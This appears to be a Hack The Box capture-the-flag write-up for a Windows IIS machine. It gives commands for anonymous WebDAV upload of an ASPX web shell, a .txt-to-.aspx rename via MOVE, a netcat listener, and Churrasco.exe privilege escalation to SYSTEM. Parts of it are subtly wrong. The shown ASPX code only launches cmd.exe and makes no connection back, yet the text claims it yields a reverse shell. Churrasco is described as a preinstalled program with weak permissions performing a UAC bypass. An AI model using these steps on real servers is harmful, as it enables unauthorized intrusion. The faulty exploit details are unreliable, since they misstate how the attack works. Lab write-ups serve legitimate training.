## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)
- **Exploits Used**:  
  - Protocol WebDAV PUT/MOVE  
  - File extension bypass via `.txt → .aspx`  
  - Local PrivEsc using `Churrasco.exe`  
- **Open Ports:**  
  - [HTTP](HTTP) 80/tcp  

---

## TLDR 🚀
- **Find** WebDAV enabled on the web server (allows PUT/MOVE).  
- **Upload** a simple ASPX web‑shell disguised as `.txt`, then **MOVE** it to `.aspx`.  
- **Invoke** the shell for remote code execution and grab a low‑privilege shell.  
- **Enumerate** locally, discover `Churrasco.exe` installed with weak permissions.  
- **Run** `Churrasco.exe` to escalate to SYSTEM.  

---

## Recon & Enumeration 🕵️‍♂️

1. **Port scan** (HTTP only):  
   ```bash
   nmap -p80 --script http-methods --script-args http-methods.url-path=/ 10.129.83.212
   ```
   - Shows `OPTIONS`, `GET`, `HEAD`, **`PUT`**, **`MOVE`**, etc. indicating WebDAV support.

2. **Directory brute-forcing** (optional):  
   ```bash
   gobuster dir -u http://10.129.83.212/ -w /usr/share/wordlists/common.txt -x txt,aspx
   ```
   - No obvious upload form—WebDAV is the vector.

3. **Confirm WebDAV** with a simple `OPTIONS` request:  
   ```bash
   curl -i -X OPTIONS http://10.129.83.212/
   ```
   - Look for `DAV: 1,2` in the response headers.

---

## Exploitation 🚀

### 1. WebDAV Upload & File‑Extension Bypass  
1. **Craft** a minimal ASPX web‑shell (`shell.txt`):
   ```asp
   <% System.Diagnostics.Process.Start("cmd.exe"); %>
   ```
2. **Upload** it to the server (anonymous WebDAV):
   ```bash
   curl -v -T shell.txt http://10.129.83.212/shell.txt
   ```
3. **Rename** it to `.aspx` so IIS will execute it:
   ```bash
   curl -v -X MOVE \
     -H "Destination: http://10.129.83.212/shell.aspx" \
     http://10.129.83.212/shell.txt
   ```
4. **Trigger** the shell:
   - Point your browser or use `curl`:
     ```bash
     curl http://10.129.83.212/shell.aspx
     ```
   - You’ll get a **reverse shell** if you’ve got a listener ready.

5. **Listener** on your machine:
   ```bash
   nc -lvnp 4444
   ```
   - Connects back as a low‑privilege Windows user.

---

## Local Privilege Escalation 🔒 → 🔓

1. **Basic enumeration**:
   ```powershell
   whoami /priv
   dir "C:\Program Files" | findstr /i Churrasco
   ```
2. **Discover** `C:\Program Files\Churrasco\Churrasco.exe` with **weak ACLs** (everyone can execute).
3. **Exploit** with the official tool:
   ```powershell
   cd "C:\Program Files\Churrasco"
   .\Churrasco.exe
   ```
   - This leverages a known COM/UAC bypass to spawn a SYSTEM shell.
4. **Verify** SYSTEM:
   ```powershell
   whoami
   # → nt authority\system
   ```

---

## Tools 🛠️
- **nmap** – port & WebDAV enumeration  
- **gobuster** – directory brute‑forcing  
- **curl** – WebDAV PUT/MOVE & shell trigger  
- **netcat** – reverse shell listener  
- **Churrasco.exe** – local PrivEsc  

---

## Commands to Solve Box 📝

```bash
# 1. Scan for WebDAV support
nmap -p80 --script http-methods --script-args http-methods.url-path=/ 10.129.83.212

# 2. Upload web‑shell disguised as .txt
curl -v -T shell.txt http://10.129.83.212/shell.txt

# 3. Rename to .aspx
curl -v -X MOVE \
  -H "Destination: http://10.129.83.212/shell.aspx" \
  http://10.129.83.212/shell.txt

# 4. Trigger shell (in another terminal)
nc -lvnp 4444

# 5. On the box, enumerate for Churrasco.exe
whoami & whoami /priv
dir "C:\Program Files" | findstr /i Churrasco

# 6. Run Churrasco for SYSTEM
cd "C:\Program Files\Churrasco"
.\Churrasco.exe
whoami  # should return nt authority\system
```

---

## Actions Learned 💡
- How to **leverage WebDAV** on IIS for anonymous file upload (PUT/MOVE).  
- Trick IIS into executing a file by **bypassing extension restrictions** (`.txt` → `.aspx`).  
- Basic Windows **local enumeration** to spot weakly‑permissioned binaries.  
- Use of **Churrasco.exe** for UAC/COM bypass to escalate from a regular user to SYSTEM.

---

## References 📚
- WebDAV PUT/MOVE on IIS:  
  – https://docs.microsoft.com/en-us/iis/configuration/system.webserver/webdav  
- HTTP Methods enumeration with Nmap:  
  – https://nmap.org/nsedoc/scripts/http-methods.html  
- Churrasco Privilege Escalation:  
  – https://github.com/adamd00/Churrasco  
- HTB WebDAV write‑up examples:  
  – https://0xdf.gitlab.io/ (for inspiration)  